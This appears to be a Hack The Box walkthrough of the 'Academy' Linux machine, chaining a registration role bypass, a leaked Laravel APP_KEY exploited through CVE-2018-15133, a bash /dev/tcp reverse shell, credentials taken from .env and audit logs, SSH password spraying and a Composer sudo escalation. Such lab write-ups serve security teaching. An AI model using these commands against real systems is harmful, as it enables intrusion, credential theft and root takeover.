---
title: "Academy"
description: "Hack The Box walkthrough covering Laravel APP_KEY exploitation, CVE-2018-15133, credential discovery through environment and audit files, and sudo abuse through Composer."
published: 2026-09-29
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
os: "Linux"
tags:
  - PHP
  - Laravel
  - CVE-2018-15133
  - Credential Discovery
  - Linux
  - Sudo
featured: true
draft: false
---

## Overview

Academy is a Linux machine that demonstrates how multiple weaknesses can be chained from an initially exposed web application through to full system compromise.

The attack path involves manipulating application registration functionality, discovering a Laravel development environment, exploiting a disclosed `APP_KEY`, recovering credentials from application configuration and Linux audit logs, and finally abusing an overly permissive sudo configuration to obtain root access.

### Key Concepts

- PHP application enumeration
- Laravel configuration and `APP_KEY` exposure
- CVE-2018-15133
- Environment file discovery
- Credential reuse
- Linux filesystem enumeration
- Credential exposure through audit logs
- Sudo enumeration
- Composer privilege escalation

---

## Initial Reconnaissance

The assessment began with TCP and UDP enumeration of the target.

```bash
nmap 10.129.68.62 -Pn -T4 --min-rate 1000 --max-retries 2 -p- -vvv -oA nmap

sudo nmap --top-ports=500 -sU -vvv -oA udp -Pn 10.129.68.62 \
  --min-rate=300 --max-retries=2 --open

nmap 10.129.68.62 -Pn -T4 --min-rate 1000 --max-retries 2 \
  -p22,80,33060 -vvv -sVC -oA nmap/service
```

Three TCP services were identified:

| Port | Service | Details |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache HTTP Server 2.4.41 |
| 33060 | MySQL X | MySQL X Protocol listener |

The HTTP service became the primary target for further enumeration.

---

## Web Application Enumeration

Content discovery identified several application endpoints:

```text
/admin.php
/login.php
/register.php
/home.php
```

Reviewing the registration workflow showed that the `register.php` request accepted a `userrole` parameter.

Manipulating this value during account creation allowed an account to be registered with a more privileged role.

The resulting account could access:

```text
/admin.php
```

This demonstrates the importance of enforcing authorisation decisions server-side rather than trusting role information supplied by the client.

---

## Development Environment Discovery

Further manual enumeration of the administrative functionality revealed an additional application hostname:

```text
dev-staging-01.academy.htb
```

After adding the hostname to the local hosts file, the development application could be accessed directly.

The staging environment exposed verbose Laravel errors containing sensitive configuration information, including database information and the application's Laravel `APP_KEY`.

The disclosed key was:

```text
dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
```

Exposing an application's cryptographic key is particularly significant because Laravel uses the key to protect encrypted application data.

The Laravel version and exposed key indicated that the application could potentially be vulnerable to **CVE-2018-15133**.

---

## Laravel APP_KEY Exploitation

CVE-2018-15133 affects vulnerable Laravel installations where an attacker has obtained the application's `APP_KEY`.

Knowledge of the key can allow specially crafted encrypted payloads to be accepted by the application, potentially resulting in remote code execution.

A Laravel exploitation script was used to verify the issue.

```bash
python pwn_laravel.py \
  http://dev-staging-01.academy.htb/ \
  dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= \
  -c pwd
```

After confirming command execution, an interactive mode was started:

```bash
python pwn_laravel.py \
  http://dev-staging-01.academy.htb/ \
  dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= \
  -interactive
```

Execution context was confirmed with:

```bash
id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This provided command execution as the Apache `www-data` account.

---

## Establishing a Shell

A listener was started on the attacking system:

```bash
nc -lvnp 9999
```

A reverse shell was then initiated from the compromised application:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.15/9999 0>&1'
```

After receiving the connection, Python was used to improve terminal functionality:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

This provided an interactive shell as:

```text
www-data
```

---

## Application Credential Discovery

With filesystem access established, the Laravel application's files were reviewed.

Laravel applications commonly store environment-specific configuration in `.env` files, making these files particularly valuable during post-exploitation enumeration.

The application's environment file was located at:

```text
/var/www/html/academy/.env
```

It was reviewed with:

```bash
cat /var/www/html/academy/.env
```

The file contained credentials including:

```text
mySup3rP4s5w0rd!!
```

This demonstrates why application configuration files should be treated as sensitive secrets rather than ordinary application data.

---

## Credential Reuse

Local users were enumerated and the recovered password was tested against relevant accounts.

For example:

```bash
nxc ssh academy.htb \
  -u users.txt \
  -p 'mySup3rP4s5w0rd!!'
```

The password was valid for:

```text
cry0l1t3
```

SSH access could therefore be established:

```bash
ssh cry0l1t3@academy.htb
```

This moved access from the restricted web-server account to an authenticated local user.

The user flag was obtained at this stage.

---

## Local Enumeration

Further privilege-escalation enumeration was performed from the `cry0l1t3` account.

LinPEAS was transferred to the target using a temporary HTTP server.

On the attacking host:

```bash
python3 -m http.server 8000
```

On the target:

```bash
wget http://10.10.15.15:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

One particularly interesting result was found within the Linux audit logs.

---

## Credentials in Audit Logs

The audit data contained terminal input associated with an earlier `su` operation.

Relevant output included:

```text
Checking for TTY (sudo/su) passwords in audit logs

sh "su mrb3n"
su "mrb3n_Ac@d3my!"
```

The corresponding audit entry contained the terminal data in hexadecimal form:

```text
type=TTY msg=audit(...):
comm="su"
data=6D7262336E5F41634064336D79210A
```

Decoding the captured terminal data revealed the password:

```text
mrb3n_Ac@d3my!
```

The credentials could then be used to move laterally to the `mrb3n` account.

This is an important example of how operating-system logging can inadvertently retain sensitive information. Audit configurations that capture terminal input should be carefully reviewed to ensure authentication secrets are not persisted.

---

## Sudo Enumeration

After obtaining access as `mrb3n`, the account's sudo permissions were reviewed:

```bash
sudo -l
```

The user was permitted to execute:

```text
/usr/bin/composer
```

with elevated privileges.

Composer supports execution of scripts defined within a `composer.json` file. Allowing an unprivileged user to execute Composer through sudo therefore creates a path to arbitrary command execution as root.

---

## Privilege Escalation via Composer

A temporary working directory was created:

```bash
TF=$(mktemp -d)
```

A minimal Composer configuration was then created containing a custom script:

```bash
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > "$TF/composer.json"
```

Finally, Composer was executed through sudo:

```bash
sudo composer --working-dir="$TF" run-script x
```

Because Composer itself was running with root privileges, the configured shell was also executed as root.

The resulting access could be confirmed using:

```bash
id
```

At this point, full administrative control of the target had been obtained and the root flag could be retrieved.

---

## Attack Path

The complete compromise path was:

```text
Web Application
      ↓
Manipulate registration role
      ↓
Administrative access
      ↓
Discover staging environment
      ↓
Laravel configuration disclosure
      ↓
APP_KEY exposure
      ↓
CVE-2018-15133
      ↓
Remote Code Execution
      ↓
www-data shell
      ↓
Laravel .env credentials
      ↓
Credential reuse
      ↓
cry0l1t3
      ↓
Audit log credential disclosure
      ↓
mrb3n
      ↓
sudo Composer
      ↓
root
```

---

## Key Takeaways

### Client-Controlled Role Information

Security-sensitive properties such as user roles must be assigned and validated by the server. Allowing the client to influence privilege information can create a direct authorisation bypass.

### Protect Application Secrets

Laravel `APP_KEY` values must remain confidential. Exposure of cryptographic application secrets can turn another vulnerability into a significantly more serious compromise.

### Review Environment Files

Files such as `.env` frequently contain database passwords, API keys and other secrets. They should have restrictive filesystem permissions and must never be exposed through the web server.

### Avoid Credential Reuse

The credentials recovered from the application configuration were also valid for a local system account, allowing the compromise to move beyond the web application.

### Audit Sensitive Logging

Terminal auditing can capture sensitive authentication data. Audit policies should be configured so that passwords and other secrets are not unnecessarily retained.

### Restrict Sudo Applications

Applications capable of executing commands, loading plugins or invoking scripts should not normally be granted unrestricted sudo access. Composer's scripting functionality made the configured sudo permission equivalent to arbitrary root command execution.

---

## Conclusion

Academy demonstrates how several individually distinct weaknesses can be chained into a complete compromise.

The initial application flaw provided access to functionality that disclosed a development environment. Sensitive Laravel configuration then enabled remote code execution, application credentials enabled access to a local account, audit logs exposed another user's password, and an unsafe sudo rule ultimately provided root access.

The machine is a useful example of why post-exploitation enumeration matters: the initial foothold was only one part of the attack path, while configuration files, credential reuse, operating-system artefacts and privilege boundaries provided the route to full compromise.